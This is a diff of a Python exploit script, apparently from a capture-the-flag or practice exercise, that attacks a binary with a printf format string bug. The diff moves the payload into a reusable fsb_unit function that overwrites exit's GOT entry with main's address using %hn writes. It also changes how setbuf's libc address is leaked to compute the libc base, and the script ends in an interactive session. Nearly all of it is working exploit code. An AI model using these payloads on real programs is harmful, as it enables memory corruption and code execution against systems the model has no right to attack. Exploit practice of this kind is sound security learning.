@@ -10,7 +10,7 @@ printf(buf);
 from ptrlib import *
 
 
-def split_byte(value:int, interval:int):
+def split_byte(value:int, interval:int) -> list:
     bytes_ = value.to_bytes(8, byteorder='little')
     chunks = [bytes_[i:i+interval] for i in range(0, 8, interval)]
     return chunks
@@ -26,6 +26,31 @@ def show_text(s:str):
     for i,j in enumerate(range(0, len(s), 8)):
         print(i + 6, s[j:j+8])
 
+# 書式文字列攻撃を行う関数
+def fsb_unit(func_addr:int , got_target_addr: int) -> bytes:
+    #func_addr = elf.symbol("main")
+    #got_target_addr = elf.got("exit")
+
+    chunks = split_byte(func_addr, 1)
+
+    chunk1: int = int(chunks[1][0]) * 0x100 + int(chunks[0][0])
+    chunk2: int = int(chunks[3][0]) * 0x100 + int(chunks[2][0])
+
+    print(
+            "chunk1: ", f"[0x{chunk1:04x}]", f"{chunk1}\n"
+            "chunk2: ", f"[0x{chunk2:04x}]", f"{chunk2}"
+    )
+
+    delta = chunk1 - chunk2
+    format_string = f'%{str(chunk2)}c%11$hn'
+    format_string += f'%{str(delta)}c%10$hn'
+    format_string += "p" * (8 - len(format_string) % 8) # 詰物
+    format_string += "pppppppp" # 計算のめんどくささを軽減する
+
+    payload = format_string.encode("ascii")
+    payload += p64(got_target_addr)
+    payload += p64(got_target_addr + 2)
+    return payload
 
 def main():
     """
@@ -59,41 +84,28 @@ uv run fsb.py
     addr_main = elf.symbol("main")
     addr_exit = elf.got("exit")
 
-    chunks = split_byte(addr_main, 1)
-
-    chunk1: int = int(chunks[1][0]) * 0x100 + int(chunks[0][0])
-    chunk2: int = int(chunks[3][0]) * 0x100 + int(chunks[2][0])
-
-    print(
-            "chunk1: ", f"[0x{chunk1:04x}]", f"{chunk1}\n"
-            "chunk2: ", f"[0x{chunk2:04x}]", f"{chunk2}"
-    )
-
-    delta = chunk1 - chunk2
-
-    format_string = f'%{str(chunk2)}c%11$hn'
-    format_string += f'%{str(delta)}c%10$hn'
-    
-    format_string += "p" * (8 - len(format_string) % 8) # 詰物
-    format_string += "pppppppp" # 計算のめんどくささを軽減する
-
-    payload = format_string.encode("ascii")
-    payload += p64(addr_exit)
-    payload += p64(addr_exit + 2)
+    payload = fsb_unit(addr_main, addr_exit)
 
     show_text(payload)
     proc.sendafter("Input message", payload) # mainを何度も呼び出せるようにするやつ
 
-    payload = b'%12$s----' # setbuf
+    addr_setbuf_got = elf.got("setbuf")
+    payload = b"%7$sPPPP"
+    payload+= p64(addr_setbuf_got)
+
     proc.sendafter("Input message", payload)
-    output = proc.recvuntil(b"----")  # マーカーまで受け取る
-    leaked = output.rstrip(b"----")
-    leaked = leaked.lstrip(b"\n")
+    proc.recv(1)
+    leaked = proc.recv(6)  # マーカーまで受け取る
     leaked_setbuf = int.from_bytes(leaked, byteorder='little') # 実際にリークされたアドレス
     # readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep ' setbuf@@GLIBC'
-    offset_setbuf = libc_elf.symbol("setbuf")         # 上で調べたオフセット
-    libc_base = leaked_setbuf - offset_setbuf
-    print("libc_base", hex(libc_base))
+    offset_setbuf = libc_elf.symbol("setbuf")
+    # 上で調べたオフセット
+    libc_elf.base = leaked_setbuf - offset_setbuf
+
+    # print("leaked_setbuf", )
+    print("leaked_setbuf", hex(leaked_setbuf))
+    print("setbuf offset", hex(offset_setbuf))
+    #print("libc_base    ", hex(libc_base))
     print("leak raw:", leaked, hex(leaked_setbuf))
     proc.interactive()
     return
